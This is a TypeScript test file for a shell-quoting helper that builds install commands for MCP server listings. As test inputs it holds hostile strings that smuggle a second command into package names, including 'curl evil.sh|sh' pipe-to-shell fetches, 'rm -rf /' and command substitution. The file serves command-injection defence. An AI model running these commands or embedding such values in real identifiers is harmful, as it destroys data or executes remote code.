import test from 'node:test';
import assert from 'node:assert/strict';
import { buildInstalls, shellArg } from './installs';
import type { IndexedServer } from './types';

function srv(over: Partial<IndexedServer>): IndexedServer {
  return {
    source: 'registry',
    slug: 'x',
    name: 'ns/x',
    title: 'X',
    description: 'd',
    version: '1.0.0',
    category: 'other',
    publishedAt: '2026-01-01T00:00:00Z',
    updatedAt: '2026-01-01T00:00:00Z',
    status: 'active',
    hasRemote: false,
    hasPackage: true,
    primaryTransport: 'stdio',
    envVars: [],
    ...over,
  };
}

test('ordinary identifiers render unquoted (no visual regression)', () => {
  for (const v of [
    '@modelcontextprotocol/server-filesystem',
    'mcp-server-git',
    'ghcr.io/apithreshold/apithreshold:0.1.0',
    'https://github.com/x/y/releases/download/v0.7/f.plugin',
    'pkg_name.v2+build-1',
  ]) {
    assert.equal(shellArg(v), v, `${v} should pass through untouched`);
  }
});

test('shell metacharacters are quoted, not passed through', () => {
  // Each of these would otherwise produce a runnable command on paste.
  const hostile: Array<[string, string]> = [
    ['x; curl evil.sh|sh', "'x; curl evil.sh|sh'"],
    ['x && rm -rf /', "'x && rm -rf /'"],
    ['x`whoami`', "'x`whoami`'"],
    ['x$(id)', "'x$(id)'"],
    ['x y', "'x y'"],
    ['x\nrm -rf /', "'x\nrm -rf /'"],
    ['x>out', "'x>out'"],
  ];
  for (const [raw, want] of hostile) assert.equal(shellArg(raw), want);
});

test('embedded single quotes are escaped POSIX-style', () => {
  // Naive quoting would let `'` close the quote and escape the sandbox.
  assert.equal(shellArg("a'b"), "'a'\\''b'");
  assert.equal(shellArg("'; rm -rf /; '"), "''\\''; rm -rf /; '\\'''");
});

test('a hostile npm identifier cannot produce a runnable command', () => {
  const out = buildInstalls(srv({ npmPackage: 'evil; curl http://x.sh | sh' }));
  const commands = out.filter((t) => t.command).map((t) => t.command!);
  assert.ok(commands.length >= 3, 'expected the three shell targets');
  for (const c of commands) {
    // The payload must be inside single quotes, so the shell treats it as one argument.
    assert.ok(
      c.includes("'evil; curl http://x.sh | sh'"),
      `unquoted payload in: ${c}`,
    );
    // And no bare metacharacter may sit outside quotes.
    const outsideQuotes = c.replace(/'[^']*'/g, '');
    assert.doesNotMatch(outsideQuotes, /[;&|`$><]/, `metacharacter escaped the quoting: ${c}`);
  }
});

test('the JSON config blocks pass the identifier as an argv element, not a shell string', () => {
  const out = buildInstalls(srv({ npmPackage: 'evil; rm -rf /' }));
  const json = out.find((t) => t.json)!.json!;
  const parsed = JSON.parse(json);
  // argv elements are exec'd directly by the client, never shell-interpreted.
  assert.deepEqual(parsed.mcpServers.x.args, ['-y', 'evil; rm -rf /']);
});

test('every emitted command survives a round trip through the shell tokenizer', () => {
  // Belt and braces: the quoted form must still name the original package.
  const pkg = "weird pkg'name";
  const out = buildInstalls(srv({ npmPackage: pkg }));
  const cline = out.find((t) => t.client === 'cline')!.command!;
  assert.equal(cline, `npx -y ${shellArg(pkg)}`);
  assert.ok(cline.startsWith('npx -y '));
});
